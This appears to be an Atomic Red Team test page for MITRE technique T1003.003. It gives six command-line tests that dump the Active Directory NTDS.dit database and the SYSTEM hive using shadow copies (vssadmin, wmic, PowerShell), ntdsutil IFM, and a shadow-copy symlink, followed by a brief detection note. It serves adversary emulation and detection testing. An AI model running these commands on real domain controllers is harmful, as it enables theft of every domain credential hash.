# T1003.003 - OS Credential Dumping: NTDS
Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)

In addition to looking NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.(Citation: Metcalf 2015)

The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

* Volume Shadow Copy
* secretsdump.py
* Using the in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy


## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Create Volume Shadow Copy with NTDS.dit
This test is intended to be run on a domain Controller.

The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
vssadmin.exe create shadow /for=#{drive_letter}
```

Invoke-AtomicTest T1003.003 -TestNumbers 1

### Atomic Test #2 - Copy NTDS.dit from Volume Shadow Copy
This test is intended to be run on a domain Controller.

The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.

This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit".
A successful test also requires the export of the SYSTEM Registry hive.
This test must be executed on a Windows Domain Controller.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
```

Invoke-AtomicTest T1003.003 -TestNumbers 2

### Atomic Test #3 - Dump Active Directory Database with NTDSUtil
This test is intended to be run on a domain Controller.

The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
uses the "IFM" or "Install From Media" backup functionality that allows Active Directory restoration or installation of
subsequent domain controllers without the need of network-based replication.

Upon successful completion, you will find a copy of the ntds.dit file in the C:\Windows\Temp directory.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
mkdir #{output_folder}
ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
```

Invoke-AtomicTest T1003.003 -TestNumbers 3

### Atomic Test #4 - Create Volume Shadow Copy with WMI
This test is intended to be run on a domain Controller.

The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
wmic shadowcopy call create Volume=#{drive_letter}
```

Invoke-AtomicTest T1003.003 -TestNumbers 4

### Atomic Test #5 - Create Volume Shadow Copy with Powershell
This test is intended to be run on a domain Controller.

The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
(gwmi -list win32_shadowcopy).Create(#{drive_letter},'ClientAccessible')
```

Invoke-AtomicTest T1003.003 -TestNumbers 5

### Atomic Test #6 - Create Symlink to Volume Shadow Copy
This test is intended to be run on a domain Controller.

The Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
vssadmin.exe create shadow /for=#{drive_letter}
mklink /D #{symlink_path} \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

Invoke-AtomicTest T1003.003 -TestNumbers 6

## Detection
Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.